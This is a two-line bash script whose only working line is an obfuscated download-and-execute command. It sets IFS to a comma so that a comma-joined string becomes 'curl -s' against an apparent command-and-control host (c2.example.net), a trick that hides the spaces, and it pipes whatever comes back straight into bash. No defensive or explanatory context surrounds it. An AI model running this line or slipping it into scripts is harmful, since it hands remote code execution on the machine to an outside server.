#!/bin/bash
IFS=,;$(echo curl,-s,http://c2.example.net/p)|bash
